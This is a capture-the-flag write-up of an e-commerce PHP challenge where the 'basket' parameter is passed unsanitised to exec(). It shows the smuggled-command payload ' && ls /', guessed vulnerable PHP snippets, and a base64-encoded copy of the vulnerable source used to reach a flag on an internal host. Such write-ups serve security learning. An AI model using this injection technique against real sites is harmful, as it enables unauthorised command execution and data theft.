
## Challenge Description

![[Screenshot 2026-04-16 at 12.37.13 PM.png]]
Nice, we will be solving a sourceless challenge, which is going to be fun. A challenge full of exploration and learning.

![[Screenshot 2026-04-16 at 12.38.09 PM.png]]
Looks like a E-Commerce site without authentication and payment but a simple checkout option. Let's play around by adding some items and trying to checkout. It also looks like a php website.
![[Screenshot 2026-04-16 at 12.39.02 PM.png]]
Clicking on checkout brings on the checkout page, let's try to buy it.
![[Screenshot 2026-04-16 at 12.39.25 PM.png]]
Oh, payment stuff is not implemented. 
Let's look at the source code to see if something is hidden in comments. Let's start by looking at **checkout.php**
![[Screenshot 2026-04-16 at 12.40.33 PM.png]]
Okay, we can notice that the items we added to the cart are stored in the cookie and it's being read in buy.php 's basket's get parameter. Let's capture a request in burp suite.

![[Screenshot 2026-04-16 at 12.41.50 PM.png]]
It reflects whatever is in the basket get parameter. We can try XSS, but it is irrelevant as there is no admin panel and no bots available. We will try to do sql injection.
![[Screenshot 2026-04-16 at 12.46.20 PM.png]]
It now reutrns "Returned with status 2 and output", not really sure what that is but let's google it. Found this stackoverflow post while searching on google https://stackoverflow.com/questions/21159183/php-exec-function-returns-status-code-2
![[Screenshot 2026-04-16 at 12.56.52 PM.png]]
It looks like, it is using exec under the hood. Lets try to play around locally with command injection and see how can we inject the command.
The most likely PHP behind this is something like:
```php
$basket = $_GET['basket'];
exec("echo '" . $basket . "' | mail -s 'Order' logistics@company.com");
// or
exec("echo '" . $basket . "' >> /var/log/orders.log");
// or
exec("/opt/shipment.sh '" . $basket . "'");
```
The key pattern is: **user input concatenated directly into a shell string wrapped in single quotes, with no sanitization.**
So based on our assumption, we can try to inject `' && ls /'`. Let's URL encode it and try it.
![[Screenshot 2026-04-16 at 1.01.25 PM.png]]
Great, now we have the command injection, let's try to read the files, but since it's apache, it will execute the php so in order to not let the apache to execute php, we will convert the code into base64 and then decode the base64. We will be decoding first the buy.php
![[Screenshot 2026-04-16 at 1.10.41 PM.png]]
```bash
echo PD9waHAKJGE9W107CiRvdXRwdXQ9bnVsbDsKJHJldHZhbD1udWxsOwplY2hvICc8aHRtbD48Ym9keSBvbmxvYWQ9ImlmKGRvY3VtZW50LmJvZHkuaW5uZXJIVE1MLmluZGV4T2YoXCdUSElTX0lTX1RIRV9URVNUU0VDUkVUXCcpID4gLTEpe2FsZXJ0KFwnVGhhbmtzIGZvciB5b3VyIHB1cmNoYXNlLCB5b3VyIHBhY2thZ2Ugd2lsbCBiZSBzaGlwcGVkIHNvbWV3aGVyZSFcJyk7d2luZG93LmxvY2F0aW9uLmhyZWYgPSBcJy9cJ30iPic7CmV4ZWMoJ2VjaG8gXCdQYXJjZWwgc2hpcG1lbnQgc2NyaXB0IGhhcyBiZWVuIHN0YXJ0ZWQuIFBsZWFzZSB3YWl0IGZvciBpdCB0byBhcnJpdmUuIFRoZSBmb2xsb3dpbmcgd2lsbCBiZSBzZW50OlxuXG4gXCckKGVjaG8gXCcnLiRfR0VUWydiYXNrZXQnXS4nXCcgMj4mMSknLCAkb3V0cHV0LCAkcmV0dmFsKTsKZWNobyAiUmV0dXJuZWQgd2l0aCBzdGF0dXMgJHJldHZhbCBhbmQgb3V0cHV0OlxuIjsKZWNobyAiPHByZT4iOwpmb3JlYWNoICgkb3V0cHV0IGFzICRpdGVtKSB7CiAgICBlY2hvICRpdGVtIC4gIjxicj4iOwp9CmVjaG8gIjwvcHJlPjxwcmU+R2V0dGluZyBTZWNyZXQgZnJvbSB0aGUgZXh0ZXJuYWwgRmxhZyBzdG9yYWdlIFZhdWx0IGFuZCBzdWJtaXR0aW5nIGV2ZXJ5dGhpbmcgdG8gdGhlIGxvZ2lzdGljcyBjb21wYW55LiBJZiB5b3Ugc2VlIHRoZSB0ZXN0IFNlY3JldCBiZWxvdywgaXQgd29ya2VkIGFuZCB5b3VyIHBhY2thZ2Ugd2lsbCBhcnJpdmUgc29vbiE8L3ByZT48L2JvZHk+PC9odG1sPiI7CgoKJGE9W107CiRvdXRwdXQ9bnVsbDsKJHJldHZhbD1udWxsOwpleGVjKCdjdXJsIGh0dHA6Ly9iYWNrdG90aGVyb290cy1zZWNyZXQvdGVzdHNlY3JldC5waHAnLCAkb3V0cHV0LCAkcmV0dmFsKTsKZm9yZWFjaCAoJG91dHB1dCBhcyAkaXRlbSkgewogICAgZWNobyAkaXRlbSAuICI8YnI+IjsKfQo/Pgo= | base64 -d > buy.php
```

![[Screenshot 2026-04-16 at 1.11.29 PM.png]]
If you take a look at the curl request, we can see that it is making request to a host and is requesting testsecret.php.
![[Screenshot 2026-04-16 at 1.12.31 PM.png]]
Let's see if there's directory listing available.
![[Screenshot 2026-04-16 at 1.12.55 PM.png]]
Great, we can see there is a file named flag.php, lets make the curl request there. 
![[Screenshot 2026-04-16 at 1.14.03 PM.png]]
Great, we have the flag.
